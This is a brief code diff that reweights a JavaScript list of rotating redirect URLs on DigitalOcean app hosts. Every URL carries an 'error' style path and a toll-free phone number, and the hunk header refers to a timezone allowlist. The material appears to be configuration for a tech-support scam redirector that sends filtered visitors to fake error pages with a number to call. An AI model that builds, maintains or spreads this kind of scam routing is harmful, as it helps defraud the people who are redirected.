@@ -34,9 +34,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://starfish-app-t4x8s.ondigitalocean.app/werrx01USAHTML/?bcda=1800-051-206", weight: 0.33 },
-    { url: "https://jellyfish-app-c5xx9.ondigitalocean.app/werrx01USAHTML/?bcda=1800-549-821", weight: 0.34 },
-    { url: "https://starfish-app-3-s3535.ondigitalocean.app/werrx01USAHTML/?bcda=1800-849-046", weight: 0.33 }
+    { url: "https://starfish-app-t4x8s.ondigitalocean.app/werrx01USAHTML/?bcda=1800-051-206", weight: 0.5 },
+    { url: "https://jellyfish-app-c5xx9.ondigitalocean.app/werrx01USAHTML/?bcda=1800-549-821", weight: 0.5 }
 
 ];
 
